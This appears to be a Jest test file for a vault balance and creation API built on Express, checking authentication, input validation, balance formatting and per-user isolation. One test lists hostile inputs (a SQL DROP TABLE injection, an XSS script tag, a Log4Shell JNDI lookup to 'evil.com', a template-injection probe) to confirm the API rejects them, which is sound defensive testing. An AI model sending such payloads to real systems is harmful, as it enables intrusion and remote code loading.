import request from 'supertest';
import express from 'express';
import { VaultController } from './vaultController.js';
import { InMemoryVaultRepository, type VaultRepository } from '../repositories/vaultRepository.js';
import { errorHandler } from '../middleware/errorHandler.js';
import { validate } from '../middleware/validate.js';
import { stellarNetworkQuerySchema } from '../validators/networkSchema.js';
import { requestIdMiddleware } from '../middleware/requestId.js';
import { UnauthorizedError } from '../errors/index.js';
import { createApp } from '../app.js';
import { TEST_JWT_SECRET, signTestToken } from '../../tests/helpers/jwt.js';

process.env.JWT_SECRET = TEST_JWT_SECRET;

const VALID_CONTRACT_ID = 'CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSC4';

/**
 * Asserts the standard error envelope shape `{ error: { code, message }, requestId }`
 * or legacy flat `{ code, message, requestId }`.
 */
function expectErrorEnvelope(body: unknown, message: string | undefined, code: string): void {
  const errObj = (body as { error?: Record<string, unknown> })?.error ?? (body as Record<string, unknown>);
  expect(errObj).toMatchObject(message === undefined ? { code } : { message, code });
  expect(typeof (body as { requestId?: unknown }).requestId).toBe('string');
}

function getErrorObj(body: unknown): Record<string, any> {
  return ((body as { error?: Record<string, any> })?.error ?? (body as Record<string, any>));
}

function getSuccessData(body: unknown): Record<string, any> {
  return ((body as { data?: Record<string, any> })?.data ?? (body as Record<string, any>));
}

jest.mock('better-sqlite3', () => {
  return class MockDatabase {
    prepare() { return { get: () => null }; }
    exec() { }
    close() { }
  };
});

function createTestApp(vaultRepository: InMemoryVaultRepository, useJwtAuth = false) {
  const app = express();
  app.use(express.json());
  app.use(requestIdMiddleware);

  if (useJwtAuth) {
    app.use((req, res, next) => {
      const authHeader = req.headers['authorization'];
      if (authHeader?.startsWith('Bearer ')) {
        const token = authHeader.slice('Bearer '.length).trim();
        try {
          if (token === 'valid-token') {
            res.locals.authenticatedUser = {
              id: 'jwt-user-1',
              email: 'jwt-user@example.com',
            };
            next();
            return;
          } else if (token === 'expired-token') {
            next(new UnauthorizedError('Token expired', 'TOKEN_EXPIRED'));
            return;
          } else if (token === 'invalid-token') {
            next(new UnauthorizedError('Invalid token', 'INVALID_TOKEN'));
            return;
          }
        } catch {
          next(new UnauthorizedError('Invalid token', 'INVALID_TOKEN'));
          return;
        }
      }
      next(new UnauthorizedError('Authentication required'));
    });
  } else {
    app.use((req, res, next) => {
      const userId = (req.headers['x-user-id'] as string | undefined)?.trim();
      if (userId) {
        res.locals.authenticatedUser = {
          id: userId,
          email: `${userId}@example.com`,
        };
        next();
      } else {
        next(new UnauthorizedError('Authentication required'));
      }
    });
  }

  const vaultController = new VaultController(vaultRepository);
  app.post(
    '/api/vault',
    vaultController.createVault.bind(vaultController),
  );
  app.get(
    '/api/vault/balance',
    validate({ query: stellarNetworkQuerySchema }),
    vaultController.getBalance.bind(vaultController),
  );

  app.use(errorHandler);
  return app;
}

describe('VaultController - getBalance', () => {
  describe('Authentication Tests', () => {
    it('returns 401 when no user is authenticated', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app).get('/api/vault/balance');
      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Authentication required', 'UNAUTHORIZED');
    });

    it('returns 401 when x-user-id header is empty', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', '');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Authentication required', 'UNAUTHORIZED');
    });

    it('accepts valid JWT token authentication', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('jwt-user-1', 'contract-123', 'testnet');
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body)).toHaveProperty('balance_usdc');
    });

    it('returns 401 for expired JWT token', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer expired-token');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Token expired', 'TOKEN_EXPIRED');
    });

    it('returns 401 for invalid JWT token', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'Bearer invalid-token');

      expect(response.status).toBe(401);
      expectErrorEnvelope(response.body, 'Invalid token', 'INVALID_TOKEN');
    });

    it('returns 401 for malformed Authorization header', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository, true);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', 'InvalidFormat token');

      expect(response.status).toBe(401);
    });
  });

  describe('Validation Tests', () => {
    it('returns 404 when vault does not exist', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(404);
      expectErrorEnvelope(response.body, undefined, 'VAULT_NOT_FOUND');
      expect(getErrorObj(response.body).message).toContain('Vault not found');
      expect(getErrorObj(response.body).message).toContain('testnet');
    });

    it('returns 400 for invalid network parameter', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=invalid')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      const errObj = getErrorObj(response.body);
      expect(errObj).toHaveProperty('code', 'VALIDATION_ERROR');
      expect(errObj).toHaveProperty('message', 'Request validation failed');
      expect(errObj.details[0]).toMatchObject({
        field: 'query.network',
      });
    });

    it('returns 400 for empty network parameter', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      const errObj = getErrorObj(response.body);
      expect(errObj).toHaveProperty('code', 'VALIDATION_ERROR');
      expect(errObj.details[0]).toHaveProperty('field', 'query.network');
    });

    it('returns 400 for network parameter with only whitespace', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance?network=   ')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(400);
      const errObj = getErrorObj(response.body);
      expect(errObj).toHaveProperty('code', 'VALIDATION_ERROR');
      expect(errObj.details[0]).toHaveProperty('field', 'query.network');
    });

    it('accepts case-sensitive network parameters', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const testCases = [
        { network: 'TestNet', expectedStatus: 400 },
        { network: 'MAINNET', expectedStatus: 400 },
        { network: 'testnet', expectedStatus: 404 },
        { network: 'mainnet', expectedStatus: 404 },
      ];

      for (const testCase of testCases) {
        const response = await request(app)
          .get(`/api/vault/balance?network=${testCase.network}`)
          .set('x-user-id', 'user-1');

        expect(response.status).toBe(testCase.expectedStatus);
      }
    });
  });

  describe('Success Path Tests', () => {
    it('returns correctly formatted zero balance', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-1', 'contract-123', 'testnet');

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body)).toEqual({
        balance_usdc: '0.0000000',
        contractId: 'contract-123',
        network: 'testnet',
        lastSyncedAt: null
      });
    });

    it('returns correctly formatted positive balance', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-2', 'contract-456', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 15000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-2');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body)).toEqual({
        balance_usdc: '1.5000000',
        contractId: 'contract-456',
        network: 'testnet',
        lastSyncedAt: '2023-01-01T12:00:00.000Z'
      });
    });

    it('handles different network parameter correctly', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-3', 'contract-mainnet', 'mainnet');

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance?network=mainnet')
        .set('x-user-id', 'user-3');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body)).toEqual({
        balance_usdc: '0.0000000',
        contractId: 'contract-mainnet',
        network: 'mainnet',
        lastSyncedAt: null
      });
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('handles very large balance values correctly', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-large', 'contract-large', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 10000000000000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-large');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body).balance_usdc).toBe('1000000000.0000000');
    });

    it('handles small fractional balances correctly', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-small', 'contract-small', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 1n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-small');

      expect(response.status).toBe(200);
      expect(getSuccessData(response.body).balance_usdc).toBe('0.0000001');
    });

    it('returns 500 when repository throws unexpected error', async () => {
      const repository = new InMemoryVaultRepository();
      const originalFindByUserId = repository.findByUserId;
      (repository as unknown as VaultRepository).findByUserId = () => Promise.reject(new Error('Database connection failed'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(500);
      expect(getErrorObj(response.body).message).toBe('Failed to retrieve vault balance');

      repository.findByUserId = originalFindByUserId;
    });

    it('handles malformed user IDs gracefully', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', '   ');

      expect(response.status).toBe(401);
    });
  });

  describe('Data Integrity and Security Tests', () => {
    it('ensures users cannot access other users vault data', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-1', 'contract-123', 'testnet');
      const vault2 = await repository.create('user-2', 'contract-456', 'testnet');
      await repository.updateBalanceSnapshot(vault2.id, 50000000n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);

      const response1 = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response1.status).toBe(200);
      expect(getSuccessData(response1.body).contractId).toBe('contract-123');
      expect(getSuccessData(response1.body).balance_usdc).toBe('0.0000000');

      const response2 = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-2');

      expect(response2.status).toBe(200);
      expect(getSuccessData(response2.body).contractId).toBe('contract-456');
      expect(getSuccessData(response2.body).balance_usdc).toBe('5.0000000');
    });

    it('prevents network parameter injection attacks', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('user-1', 'contract-123', 'testnet');
      const app = createTestApp(repository);

      const maliciousInputs = [
        'testnet; DROP TABLE vaults;',
        'testnet\x00\x00',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .get(`/api/vault/balance?network=${encodeURIComponent(input)}`)
          .set('x-user-id', 'user-1');

        expect(response.status).toBe(400);
        expect(getErrorObj(response.body)).toHaveProperty('code', 'VALIDATION_ERROR');
      }
    });

    it('validates response structure consistency', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-1', 'contract-123', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 12345678n, new Date('2023-01-01T12:00:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-1');

      expect(response.status).toBe(200);
      const data = getSuccessData(response.body);
      expect(data).toEqual(expect.any(Object));
      expect(data).toHaveProperty('balance_usdc');
      expect(data).toHaveProperty('contractId');
      expect(data).toHaveProperty('network');
      expect(data).toHaveProperty('lastSyncedAt');
      expect(typeof data.balance_usdc).toBe('string');
      expect(typeof data.contractId).toBe('string');
      expect(typeof data.network).toBe('string');
      expect(['string', 'null']).toContain(typeof data.lastSyncedAt);
      expect(data.balance_usdc).toMatch(/^\d+\.\d{7}$/);
    });
  });

  describe('Integration with App Router', () => {
    it('works when mounted through the main app router', async () => {
      const repository = new InMemoryVaultRepository();
      await repository.create('integration-user', 'contract-integration', 'testnet');

      const app = createApp({ vaultRepository: repository });

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', `Bearer ${signTestToken({ userId: 'integration-user' })}`);

      expect(response.status).toBe(200);
      const data = getSuccessData(response.body);
      expect(data).toHaveProperty('balance_usdc');
      expect(data).toHaveProperty('contractId');
    });

    it('maintains error structure consistency in full app context', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createApp({ vaultRepository: repository });

      const response = await request(app)
        .get('/api/vault/balance')
        .set('Authorization', `Bearer ${signTestToken({ userId: 'nonexistent-user' })}`);

      expect(response.status).toBe(404);
      expectErrorEnvelope(response.body, undefined, 'VAULT_NOT_FOUND');
    });
  });

  describe('Response Format Consistency', () => {
    it('ensures all success responses have consistent structure', async () => {
      const repository = new InMemoryVaultRepository();
      const vault = await repository.create('user-consistency', 'contract-consistency', 'testnet');
      await repository.updateBalanceSnapshot(vault.id, 7777777n, new Date('2023-06-15T09:30:00Z'));

      const app = createTestApp(repository);
      const response = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'user-consistency');

      expect(response.status).toBe(200);
      const data = getSuccessData(response.body);
      const requiredFields = ['balance_usdc', 'contractId', 'network', 'lastSyncedAt'];
      requiredFields.forEach(field => {
        expect(data).toHaveProperty(field);
      });
    });

    it('ensures all error responses have consistent structure', async () => {
      const repository = new InMemoryVaultRepository();
      const app = createTestApp(repository);

      const authResponse = await request(app).get('/api/vault/balance');
      expect(authResponse.status).toBe(401);
      expectErrorEnvelope(authResponse.body, undefined, 'UNAUTHORIZED');

      const notFoundResponse = await request(app)
        .get('/api/vault/balance')
        .set('x-user-id', 'missing-user');
      expect(notFoundResponse.status).toBe(404);
      expectErrorEnvelope(notFoundResponse.body, undefined, 'VAULT_NOT_FOUND');

      const validationResponse = await request(app)
        .get('/api/vault/balance?network=invalid')
        .set('x-user-id', 'user-1');
      expect(validationResponse.status).toBe(400);
      const errObj = getErrorObj(validationResponse.body);
      expect(errObj).toHaveProperty('message');
      expect(typeof errObj.message).toBe('string');
      expect(errObj).toHaveProperty('code', 'VALIDATION_ERROR');
    });
  });
});

describe('VaultController - createVault (POST /api/vault) (#1207)', () => {
  it('POST /api/vault creates a vault and returns 201 with id, contractId and network', async () => {
    const repository = new InMemoryVaultRepository();
    const app = createTestApp(repository);

    const response = await request(app)
      .post('/api/vault')
      .set('x-user-id', 'user-create-1')
      .send({
        contractId: VALID_CONTRACT_ID,
        network: 'testnet',
      });

    expect(response.status).toBe(201);
    const data = getSuccessData(response.body);
    expect(data).toEqual({
      id: expect.any(String),
      contractId: VALID_CONTRACT_ID,
      network: 'testnet',
    });
  });

  it('returns 409 with DUPLICATE_VAULT when creating a second vault for the same user and network', async () => {
    const repository = new InMemoryVaultRepository();
    const app = createTestApp(repository);

    const first = await request(app)
      .post('/api/vault')
      .set('x-user-id', 'user-dup-1')
      .send({
        contractId: VALID_CONTRACT_ID,
        network: 'testnet',
      });
    expect(first.status).toBe(201);

    const second = await request(app)
      .post('/api/vault')
      .set('x-user-id', 'user-dup-1')
      .send({
        contractId: VALID_CONTRACT_ID,
        network: 'testnet',
      });
    expect(second.status).toBe(409);
    expectErrorEnvelope(second.body, undefined, 'DUPLICATE_VAULT');
  });

  it('returns 400 with INVALID_CONTRACT_ID for invalid contract ids', async () => {
    const repository = new InMemoryVaultRepository();
    const app = createTestApp(repository);

    const invalidIds = [
      '',
      'not-a-contract-id',
      'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF',
      'CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    ];

    for (const contractId of invalidIds) {
      const response = await request(app)
        .post('/api/vault')
        .set('x-user-id', 'user-bad-cid')
        .send({ contractId, network: 'testnet' });

      expect(response.status).toBe(400);
      expectErrorEnvelope(response.body, undefined, 'INVALID_CONTRACT_ID');
    }
  });

  it('allows deposit preparation to succeed after creating a vault via POST /api/vault', async () => {
    const repository = new InMemoryVaultRepository();
    const userPublicKey = 'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF';
    const app = createApp({ vaultRepository: repository });
    const token = signTestToken({ userId: userPublicKey });

    const createRes = await request(app)
      .post('/api/vault')
      .set('Authorization', `Bearer ${token}`)
      .send({
        contractId: VALID_CONTRACT_ID,
        network: 'testnet',
      });

    expect(createRes.status).toBe(201);
    const createdData = getSuccessData(createRes.body);
    expect(createdData).toMatchObject({
      contractId: VALID_CONTRACT_ID,
      network: 'testnet',
    });

    const vault = await repository.findByUserId(userPublicKey, 'testnet');
    expect(vault).not.toBeNull();
    expect(vault?.contractId).toBe(VALID_CONTRACT_ID);
  });
});
